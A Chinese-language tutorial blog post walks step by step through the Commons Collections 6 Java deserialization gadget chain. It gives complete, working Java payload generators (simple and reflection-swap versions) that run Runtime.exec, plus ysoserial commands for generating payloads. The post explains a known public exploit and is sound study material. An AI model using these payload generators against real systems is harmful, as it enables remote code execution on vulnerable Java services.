# 代码审计 | CC6 链 —— 反向构造 payload 与 ysoserial

- [为什么需要 CC6？CC1 的限制](#为什么需要-cc6cc1-的限制)
- [CC6 存在的意义](#cc6-存在的意义)
- [调用链全貌](#调用链全貌)
- [一步步构造 CC6](#一步步构造-cc6)
  - [第一步：用 ChainedTransformer 串联恶意链](#第一步用-chainedtransformer-串联恶意链)
  - [第二步：LazyMap.get() 触发 transform](#第二步lazymapget-触发-transform)
  - [第三步：谁调用 get()？——TiedMapEntry.getValue()](#第三步谁调用-gettiledmapentrygetvalue)
  - [第四步：谁调用 getValue()？——TiedMapEntry.hashCode()](#第四步谁调用-getvaluetiledmapentryhashcode)
  - [第五步：HashSet.readObject() 触发 hashCode()](#第五步hashsetreadobject-触发-hashcode)
- [大坑：序列化时就触发了](#大坑序列化时就触发了)
  - [缓存问题的根因](#缓存问题的根因)
  - [解法一：add 之后直接 clear](#解法一add-之后直接-clear)
  - [解法二（完整版）：假链 + 反射换真链](#解法二完整版假链--反射换真链)
- [对比 ysoserial 的实现](#对比-ysoserial-的实现)
- [为什么说 CC6 是通杀链](#为什么说-cc6-是通杀链)

---

## 为什么需要 CC6？CC1 的限制

在学 CC1 的时候就注意到它有两个比较关键的版本限制：

1. **JDK 版本限制（最关键）**：CC1 要求 JDK 8u71 之前，8u71 之后 AnnotationInvocationHandler 的 readObject 逻辑被改掉了，链子就断了。
2. **Commons Collections 版本限制**：需要 Commons Collections 3.1 ~ 3.2.1，不支持 CC4.x。

这就导致一个很现实的问题：很多生产环境跑的 JDK 版本不一定刚好在 8u71 以下，CC1 的适用范围其实挺窄的。

---

## CC6 存在的意义

CC6 的解法思路很直接——**把触发入口整个换掉**，不走 AnnotationInvocationHandler 这条路，改用 `HashSet → TiedMapEntry → LazyMap.get()` 来触发。因为新的触发路径不依赖那个被改掉的类，所以：

- **不受 JDK 版本限制**（8u71+、JDK 11 都能打）
- 支持 Commons Collections 3.x

说白了，CC6 就是拿 CC1 的执行链（ChainedTransformer 那套），然后换了一个新的"引爆方式"。

### 为什么 CC6 能绕过 JDK 限制？

CC1 依赖 `AnnotationInvocationHandler.readObject()` 来触发 LazyMap.get()，而这个类在 8u71 被修改了。CC6 的思路是**完全换一个触发入口**，找一个在任意 JDK 版本下，readObject() 都会调用 hashCode() 的类。这个答案就是 HashSet。

---

## 调用链全貌

```
HashSet.readObject()
  → HashMap.put()
    → HashMap.hash(key)
      → TiedMapEntry.hashCode()
        → TiedMapEntry.getValue()
          → LazyMap.get()
            → ChainedTransformer.transform()
              → InvokerTransformer.transform()
                → Runtime.exec()
```

后半段（LazyMap 之后）和 CC1 LazyMap 版本一模一样，区别就在前半段的触发方式。

---

## 一步步构造 CC6

### 第一步：用 ChainedTransformer 串联恶意链

这部分和 CC1 完全一样，通过反射拿到 Runtime 然后执行命令：

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"calc"})
};
ChainedTransformer chain = new ChainedTransformer(transformers);
```

执行效果等价于 `Runtime.getRuntime().exec("calc")`。

---

### 第二步：LazyMap.get() 触发 transform

CC6 依然借用 LazyMap，核心还是它的 get() 方法：

```java
public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        Object value = factory.transform(key); // 触发我们的 chain
        super.map.put(key, value);
        return value;
    }
    return super.map.get(key);
}
```

只要用一个**不存在的 key** 去调 `lazyMap.get(key)`，就会走 transform 逻辑。

LazyMap 的构造方法是 protected，所以要用它暴露出来的 `decorate()` 工厂方法来构造：

```java
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chain);
```

---

### 第三步：谁调用 get()？——TiedMapEntry.getValue()

这里就和 CC1 分叉了。CC1 是靠 `AnnotationInvocationHandler.invoke()` 里的 get 来触发，而 CC6 选的是 `TiedMapEntry.getValue()`。

TiedMapEntry 也是 commons-collections 里的一个类，它持有一个 map 和一个 key。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image1.png)

它的 getValue() 方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image2.png)

```java
public Object getValue() {
    return map.get(key); // 直接调用传入 map 的 get 方法
}
```

如果让 TiedMapEntry 内部的 map 指向我们构造的 LazyMap，那么：

> 调用 `tiedMapEntry.getValue()` → 调用 `lazyMap.get(key)` → 触发命令执行

并且 TiedMapEntry 的构造方法是 public 的，可以直接 new：

```java
TiedMapEntry entry = new TiedMapEntry(lazyMap, "xxx");
entry.getValue(); // 此时可以直接触发
```

key 的值没有严格要求，随便写一个字符串就行。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image3.png)

---

### 第四步：谁调用 getValue()？——TiedMapEntry.hashCode()

在 TiedMapEntry 的同一个文件里，找到了 hashCode() 方法，它内部会调用 getValue()：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image4.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image5.png)

看到这里可能会觉得：`getValue()` 和 `hashCode()` 不都能直接触发吗，有什么区别？

确实，单独调用这两个都能触发，但 hashCode 是 CC6 绕过 JDK 限制的关键所在——因为 HashSet 的 readObject() 方法在反序列化时会自动调用 hashCode()，不需要我们手动触发。

---

### 第五步：HashSet.readObject() 触发 hashCode()

看一下 HashSet 的 readObject() 方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image6.png)

```java
// HashSet.readObject() 简化逻辑
for (int i = 0; i < size; i++) {
    E e = (E) s.readObject();
    map.put(e, PRESENT); // map 是 HashMap，e 是我们的 TiedMapEntry
}
```

跟进 `map.put(e, PRESENT)` 会发现内部会调用 put 函数：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image7.png)

然后是 hash 函数：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image8.png)

这里的 key 就是 `map.put(e, PRESENT)` 里的 e，也就是我们的 TiedMapEntry，所以最终会调用 `TiedMapEntry.hashCode()`。

而整个逻辑都在 HashSet.readObject() 里面，也就是说：**反序列化 HashSet 时必然触发这条链**。

---

## 大坑：序列化时就触发了

调用链搞清楚之后，开始动手构造 HashSet 对象。可以看到 HashSet 的构造方法不需要传参：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image9.png)

但如果直接写成这样：

```java
ChainedTransformer chain = new ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "xxx");
HashSet hashSet = new HashSet();
```

此时 HashSet 和 TiedMapEntry 还没有关联，没有效果：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image10.png)

需要把 TiedMapEntry 添加进 HashSet，才能在 readObject 的 for 循环里被遍历到。构造方法不传参，所以用 add：

```java
hashSet.add(entry);
```

---

但这里就碰到问题了。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image11.png)

**add() 方法内部也会调用 `map.put(e, PRESENT)`**，这意味着在本地添加元素的时候就已经触发了一次 hashCode()，链子直接在序列化阶段就跑了。

如果 payload 直接这么写：

```java
ChainedTransformer chain = new ChainedTransformer(transformers);

Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chain);

TiedMapEntry entry = new TiedMapEntry(lazyMap, "xxx");

HashSet hashSet = new HashSet();
hashSet.add(entry); // ⚠️ 这里就执行了 calc，计算器直接在本机弹了

try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.ser"))) {
    oos.writeObject(hashSet);
}
```

序列化的时候就被触发了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image12.png)

反序列化的时候反而没有触发：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image13.png)

---

### 缓存问题的根因

问题出在 LazyMap 的 get() 方法里的缓存机制：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image14.png)

```java
public Object get(Object key) {
    // 关键判断：检查 map 仓库里是否已经有了这个 key
    if (map.containsKey(key) == false) {
        // 只有仓库里【没有】这个 key，才会触发 transform
        Object value = factory.transform(key);
        // 进货完成后，把结果存入仓库（产生缓存）
        map.put(key, value);
        return value;
    }
    // 如果仓库里【已经有】这个 key 了，直接返回旧值
    // 此时根本不会走到上面的 transform() 逻辑
    return map.get(key);
}
```

**一句话总结：只要 innerMap 不是空的，恶意链就永远没机会上场。**

整个流程是这样的：

1. 本地 `hashSet.add(entry)` 触发了 `lazyMap.get("xxx")`
2. 因为 innerMap 是空的，第一次会执行 transform（弹计算器），然后把 `{"xxx": 结果}` 这个键值对缓存到 innerMap 里
3. 反序列化时，HashSet.readObject() 再次走到 `lazyMap.get("xxx")`
4. 此时 innerMap 里已经有 "xxx" 这个 key 了，直接返回缓存值，不再执行 transform

---

### 解法一：add 之后直接 clear

既然问题是缓存，那清掉就行了：

```java
hashSet.add(entry); // 此时触发命令，innerMap 产生缓存
innerMap.clear();   // 清空缓存，之后序列化进去的 innerMap 是空的
```

完整 payload（简化版，序列化时会弹一次，反序列化时再弹一次）：

```java
public class CC6Simple {
    public static void main(String[] args) throws Exception {
        // 1. 真正的恶意链
        Transformer[] trueTransformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"calc"})
        };
        ChainedTransformer trueChain = new ChainedTransformer(trueTransformers);

        // 2. 构造 LazyMap
        Map innerMap = new HashMap();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, trueChain);

        // 3. 创建 TiedMapEntry 并添加进 HashSet
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "xxx");
        HashSet hashSet = new HashSet();
        hashSet.add(entry); // ⚠️ 此时会弹一次计算器，innerMap 产生缓存

        // 4. 清空缓存，否则反序列化时 LazyMap.get 会直接返回旧值
        innerMap.clear();

        // 5. 序列化
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.ser"))) {
            oos.writeObject(hashSet);
        }
        System.out.println("payload.ser 生成完毕");
    }
}
```

运行效果：序列化时弹一次（因为 add 触发），但 innerMap 已被清空：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image15.png)

反序列化时正常触发：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image16.png)

---

### 解法二（完整版）：假链 + 反射换真链

如果不想让序列化阶段弹窗（更接近实战场景），可以先用假链条占位，等 add 完成之后再通过反射把真链换进去，最后清缓存。

思路：
1. 先构造一个无害的假链（只返回常量 1，不执行任何命令）
2. 用假链构造 LazyMap，然后 add 进 HashSet，此时触发的是假链，不会弹窗
3. 通过反射把 LazyMap 内部的 factory 字段从假链换成真链
4. 清空 innerMap 缓存

```java
public class CC6Generator {
    public static void main(String[] args) throws Exception {
        // 1. 真正的恶意链条
        Transformer[] trueTransformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"calc"})
        };
        ChainedTransformer trueChain = new ChainedTransformer(trueTransformers);

        // 2. 构造假链条——防止本地弹窗
        Transformer fakeChain = new ConstantTransformer(1);
        // 也可以用 ChainedTransformer 包一个 ConstantTransformer(1) 的数组
        //Transformer[] fakeTransformers = new Transformer[]{ new ConstantTransformer(1) };
        //ChainedTransformer fakeChain = new ChainedTransformer(fakeTransformers);

        // 3. 组装 LazyMap 和 TiedMapEntry，绑定的是假链
        Map innerMap = new HashMap();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, fakeChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "pwn");

        // 4. 添加进 HashSet，触发假链（innerMap 产生缓存 {"pwn": 1}，但不弹窗）
        HashSet hashSet = new HashSet();
        hashSet.add(entry);

        // ===== 反射调包环节 =====

        // 5. 反射：将 LazyMap 的 factory 字段从假链换成真链
        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, trueChain);

        // 6. 清空 innerMap 缓存
        // 必须清空，否则反序列化时 containsKey("pwn") 成立，直接返回旧值，不触发命令
        innerMap.clear();

        // ===== 序列化输出 =====
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.ser"))) {
            oos.writeObject(hashSet);
        }
        System.out.println("Payload 生成完毕！序列化阶段未触发，缓存已清空。");
    }
}
```

效果：序列化阶段不触发，反序列化时正常弹窗。

> **补充**：上面假链用的接口是 `Transformer`可以传入int参数，其实也可以换成 ChainedTransformer 接口。但 ChainedTransformer 的构造函数需要传入 `Transformer[]` 数组，不能直接传 int，所以需要包一层：
>
> ```java
> Transformer[] fakeTransformers = new Transformer[]{ new ConstantTransformer(1) };
> ChainedTransformer fakeChain = new ChainedTransformer(fakeTransformers);
> ```

---

## 对比 ysoserial 的实现

ysoserial 里也有 CC6 的实现，可以直接用：

```bash
java -jar ysoserial.jar CommonsCollections6 "calc" > cc6.ser
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image17.png)

把生成的 cc6.ser 放到项目根目录，用之前写的反序列化代码跑一下，可以正常触发：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image18.png)

在 `ysoserial/payloads/` 下能找到 CommonsCollections6.class：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cc6_image19.png)

看了下源码，ysoserial 的实现思路大差不差，不过它不是先传假链，而是直接传了一个无害字符串占位，然后通过反射直接修改底层的链条。另外原版还做了更多细节处理来保证兼容性，总体思路是一致的。

---

## 为什么说 CC6 是通杀链

CC6 在 **JDK 版本兼容性** 和 **依赖环境稳定性** 上远优于 CC1、CC2 这些链：

- **通杀 JDK 6 ~ 8u71 以及 8u71 以上的所有版本**（直到 Commons Collections 被修复的版本）
- 触发路径（HashSet → TiedMapEntry → LazyMap）完全不依赖 AnnotationInvocationHandler，绕开了 8u71 的修复
- HashSet/HashMap 是 JDK 标准库里最稳定的类，不会因版本迭代被修改

所以在实际打 Java 反序列化的时候，如果不确定对端 JDK 版本，CC6 往往是优先选择的链。

ysoserial 使用方式：

```bash
java -jar ysoserial.jar [利用链名称] '[要执行的命令]' > payload.bin

# 例如：
java -jar ysoserial.jar CommonsCollections6 "calc" > cc6.ser
```
